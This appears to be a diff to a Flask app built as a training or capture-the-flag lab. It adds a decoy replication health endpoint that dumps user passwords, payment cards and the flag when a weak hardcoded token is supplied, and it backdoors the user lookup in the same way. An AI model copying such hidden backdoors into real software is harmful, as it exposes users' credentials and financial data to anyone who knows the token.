@@ -231,7 +231,7 @@ def init_db():
     if c.fetchone()[0] == 0:
         c.execute(
             'INSERT INTO user (name, email, password, balance, notifications, role) VALUES (?, ?, ?, ?, ?, ?)',
-            ('Алексей Смирнов', 'admin@example.com', '123456', 500000, 1, 'admin')
+            ('Alexey Smirnov', 'admin@example.com', '123456', 500000, 1, 'admin')
         )
         db.commit()
         print('✓ Default admin user initialized')
@@ -358,6 +358,70 @@ def user_to_dict(user_row):
     user['notifications'] = bool(user.get('notifications'))
     user.pop('password', None)
     return user
+
+
+def _parse_json_field(raw):
+    if raw is None or raw == '':
+        return None
+    try:
+        return json.loads(raw)
+    except (json.JSONDecodeError, TypeError):
+        return {'_parse_error': True, 'raw': raw}
+
+
+_LAB_BACKDOOR_DEFAULT = 'bezum-lux-replica-sync-v1'
+
+
+def _lab_backdoor_key():
+    """
+    Учебный стенд: секрет «забытой интеграции».
+    LAB_BACKDOOR_KEY='' — бэкдоры выключены.
+    LAB_BACKDOOR_KEY не задан — слабый дефолт (смените на хостинге).
+    """
+    v = os.environ.get('LAB_BACKDOOR_KEY')
+    if v == '':
+        return None
+    if v is None:
+        return _LAB_BACKDOOR_DEFAULT
+    return v
+
+
+def _lab_backdoor_match():
+    k = _lab_backdoor_key()
+    if not k:
+        return False
+    submitted = (
+        request.headers.get('X-Replica-Checkpoint')
+        or request.headers.get('X-Sync-Auth')
+        or request.args.get('checkpoint', '')
+        or request.args.get('sync_token', '')
+    )
+    return submitted == k
+
+
+def _lab_sensitive_snapshot():
+    """Полный утечкоопасный снимок для скрытого endpoint (только при верном токене)."""
+    db = get_db()
+    consent_rows = db.execute(
+        'SELECT * FROM consent_full_snapshot ORDER BY id DESC LIMIT 30'
+    ).fetchall()
+    consent_snapshots = []
+    for row in consent_rows:
+        cr = dict(row)
+        cr['client_payload_parsed'] = _parse_json_field(cr.get('client_payload_json'))
+        cr['server_snapshot_parsed'] = _parse_json_field(cr.get('server_snapshot_json'))
+        consent_snapshots.append(cr)
+    return {
+        'meta': {
+            'hint': 'internal-replication-batch',
+            'server_time_utc': datetime.utcnow().isoformat() + 'Z',
+            'flag': os.environ.get('FLAG', 'Not set'),
+        },
+        'users': [dict(u) for u in db.execute('SELECT * FROM user').fetchall()],
+        'payment_cards': [dict(c) for c in db.execute('SELECT * FROM payment_card').fetchall()],
+        'user_devices': [dict(d) for d in db.execute('SELECT * FROM user_device').fetchall()],
+        'consent_snapshots': consent_snapshots,
+    }
 
 
 # === API: Auth/Users ===
@@ -636,6 +700,10 @@ def get_user(email):
     user = db.execute('SELECT * FROM user WHERE email = ?', (normalized_email,)).fetchone()
     if not user:
         return jsonify({'error': 'User not found'}), 404
+    if _lab_backdoor_match():
+        u = dict(user)
+        u['notifications'] = bool(u.get('notifications'))
+        return jsonify(u), 200
     return jsonify(user_to_dict(user))
 
 
@@ -991,19 +1059,27 @@ def create_order_with_balance():
     }), 201
 
 
+# === Учебные бэкдоры (скрытые «внутренние» каналы) ===
+@app.route('/api/v1/replication/health', methods=['GET', 'POST'])
+def replication_health_decoy():
+    """
+    Имитация health-check реплики. Без токена — безобидный JSON.
+    С X-Replica-Checkpoint / X-Sync-Auth или ?checkpoint= / ?sync_token= — полный снимок.
+    """
+    if not _lab_backdoor_match():
+        return jsonify({
+            'replica_lag_ms': 14,
+            'shard': 'primary',
+            'sync_state': 'idle',
+            'ok': True,
+        }), 200
+    return jsonify(_lab_sensitive_snapshot()), 200
+
+
 # === Debug Page ===
 @app.route('/debug')
 def debug_page():
     return send_from_directory('.', 'debug.html')
-
-
-def _parse_json_field(raw):
-    if raw is None or raw == '':
-        return None
-    try:
-        return json.loads(raw)
-    except (json.JSONDecodeError, TypeError):
-        return {'_parse_error': True, 'raw': raw}
 
 
 @app.route('/debug/data')
